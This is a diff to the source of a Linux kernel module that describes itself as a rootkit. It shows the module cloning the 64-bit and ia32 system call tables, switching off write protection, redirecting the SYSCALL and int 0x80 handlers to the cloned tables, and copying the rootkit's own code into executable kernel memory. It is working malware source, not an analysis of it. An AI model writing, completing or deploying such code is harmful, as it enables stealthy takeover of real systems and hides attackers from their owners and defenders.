@@ -99,6 +99,7 @@
 #endif
 //#define sleep(var) for(var = 0; var <= 1024 * 1024 * 1024; var++) {}
 #define sleep(var)
+
 /*
  * Kernel shared definitions: labels, variables and functions.
  */
@@ -183,6 +184,7 @@ int init_module(void)
     f_kfree = kfree;
     f_find_vpid = find_vpid;
     f_vscnprintf = vscnprintf;
+	f_printk = printk;
 
 	/*
      * uncomment this to be able to print into stdout/stderr with pinfo() and perr() functions, in dev mode.
@@ -202,13 +204,10 @@ int init_module(void)
 		return 0;
 	}
 	sys_call_table = tmp;
+    ia32_sys_call_table = search_ia32sct_int80h(&pia32sct);
 
-	/*
-     * Linux Kernel syscall symbols for our rootkit.
-     */
-    f_sys_write = sys_call_table[__NR_write]; // now we can print into stdout and stderr =)
-
-	pinfo("Hurra! sys_call_table = %p, fastpath_location = %p, slowpath_location = %p\n", sys_call_table, psct_fastpath, psct_slowpath);
+	pinfo("Hurra! sys_call_table = %p, fastpath_location = %p, slowpath_location = %p, ia32_sys_call_table = %p, pia32sct = %p\n", sys_call_table, psct_fastpath, psct_slowpath,
+	ia32_sys_call_table, pia32sct);
 
 	/*
 	 * Search not exported symbols.
@@ -270,28 +269,8 @@ int init_module(void)
 	sleep(ret);
 
 	/*
-	 * Install the new sct into SYSCALL handler.
+	 * Clone the ia32 sct.
 	 */
-	pinfo("before psct_fastpath = %x, psct_slowpath = %x\n", *psct_fastpath, *psct_slowpath);
-	addr = (int) my_sct;
-	disable_wp();
-	ret = probe_kernel_write(psct_fastpath, &addr, sizeof(int));
-	ret = probe_kernel_write(psct_slowpath, &addr, sizeof(int));
-	enable_wp();
-	if (ret != 0) {
-		perr("Sorry, error while replacing sys_call_table on SYSCALL handler.\n");
-		return 0;
-	}
-	pinfo("after psct_fastpath = %x, psct_slowpath = %x\n", *psct_fastpath, *psct_slowpath);
-
-	sleep(ret);
-
-	/*
-	 * Install the new sct into int $0x80 handler.
-	 */
-	ia32_sys_call_table = search_ia32sct_int80h(&pia32sct);
-	pinfo("ia32_sys_call_table = %p, ia32sct_location = %p\n", ia32_sys_call_table, pia32sct);
-
 	ret = sct_len(ia32_sys_call_table, &my_sct_len);
 	if (ret != 0) {
 		perr("Sorry, sct_len(ia32_sct) ret = %d.\n", ret);
@@ -332,60 +311,39 @@ int init_module(void)
 	pinfo("ia32_sct cloned at = %p\n", my_ia32sct);
 
 	sleep(ret);
-/*
-	// restore SYSCALL handler
-	addr = (int) sys_call_table;
+
+    /*
+     * Install the new SCTs into SYSCALL handler, and int 0x80 handler.
+     */
+    pinfo("before psct_fastpath = %x, psct_slowpath = %x, pia32sct = %x\n", *psct_fastpath, *psct_slowpath, *pia32sct);
+    addr = (int) my_sct;
     disable_wp();
     ret = probe_kernel_write(psct_fastpath, &addr, sizeof(int));
-	ret = probe_kernel_write(psct_slowpath, &addr, sizeof(int));
+    ret = probe_kernel_write(psct_slowpath, &addr, sizeof(int));
+	addr = (int) my_ia32sct;
+	ret = probe_kernel_write(pia32sct, &addr, sizeof(int));
     enable_wp();
+    if (ret != 0) {
+        perr("Sorry, error while replacing sys_call_table on SYSCALL handler.\n");
+        return 0;
+    }
+    pinfo("after psct_fastpath = %x, psct_slowpath = %x, pia32sct = %x\n", *psct_fastpath, *psct_slowpath, *pia32sct);
 
-	pinfo("restored psct_fastpath = %x, psct_slowpath = %x\n", *psct_fastpath, *psct_slowpath);
-*/
-
-
-/*
-	pinfo("%p\n", __rdmsr(MSR_LSTAR));
-	char *p = __rdmsr(MSR_LSTAR);
-	p[0] = 0x90;
-	disassemble(p, 1);
-*/
-/*	
-	unsigned long mstart = (unsigned long)get_cpu_entry_area(nr_cpu_ids);
-	unsigned long mend = (unsigned long)get_cpu_entry_area(nr_cpu_ids + 1) - PAGE_SIZE;
-	size_t msize = mend - mstart;
-	pinfo("mstart = %p, mend = %p, size = %d, pages = %d\n", mstart, mend, msize, msize / PAGE_SIZE);
-	void *p = f__vmalloc_node_range(PAGE_SIZE, 1,
-                    mstart,
-                    mend, GFP_KERNEL,
-                    PAGE_KERNEL_EXEC, 0, NUMA_NO_NODE,
-                    __builtin_return_address(0));
-	pinfo("%p\n", p);
-	if (p != NULL)
-		(*f_kfree())(p);
-
-	int i = 0;
-	for(; i < nr_cpu_ids; i++) {
-		unsigned long p = __rdmsr(MSR_LSTAR);
-		pinfo("MSR_LSTAR = %p, cpu_entry_area(%d) = %p, offset = %lx\n", p, i, get_cpu_entry_area(i), p - (unsigned long)get_cpu_entry_area(i));
-		disassemble((unsigned long)get_cpu_entry_area(i) + 0x5000, 0x3c);
-	}
-*/
-
-	//printk("kernel_len = %d, kernel_paglen = %d, kernel_pages = %d, kernel_addr = %p, kernel_pagdown_addr = %p\n", kernel_len, kernel_paglen, kernel_pages, &kernel_start, PAGE_ROUND_DOWN(&kernel_start));
+    sleep(ret);
 
 	/*
      * Insert out rootkit into memory.
 	 */
 	pinfo("kernel_len = %d, kernel_paglen = %d, kernel_pages = %d, kernel_start = %p, kernel_start_pagdown = %p\n", kernel_len, kernel_paglen, kernel_pages, &kernel_start, PAGE_ROUND_DOWN(&kernel_start));
-	kernel_addr = f_kmalloc(kernel_paglen, GFP_KERNEL);
+	//kernel_addr = f_kmalloc(kernel_paglen, GFP_KERNEL);
+	kernel_addr = f__vmalloc_node_range(kernel_paglen, 1, MODULES_VADDR, MODULES_END, GFP_KERNEL, PAGE_KERNEL_EXEC, 0, NUMA_NO_NODE, __builtin_return_address(0));
 	if (kernel_addr != NULL) {
 		pinfo("kernel_addr = %p, kernel_addr_pagdown = %p\n", kernel_addr, PAGE_ROUND_DOWN(kernel_addr));
 		/*
 		 * Make our rootkit code executable.
 		 */
-		ret = set_memory_x(PAGE_ROUND_DOWN(kernel_addr), kernel_pages);
-		pinfo("ret = %d\n", ret);
+		//ret = set_memory_x(PAGE_ROUND_DOWN(kernel_addr), kernel_pages);
+		//pinfo("ret = %d\n", ret);
 		//pinfo("kernel_addr's pages are now executable.\n");
 		
 		ret = probe_kernel_write(kernel_addr, &kernel_start, kernel_len);
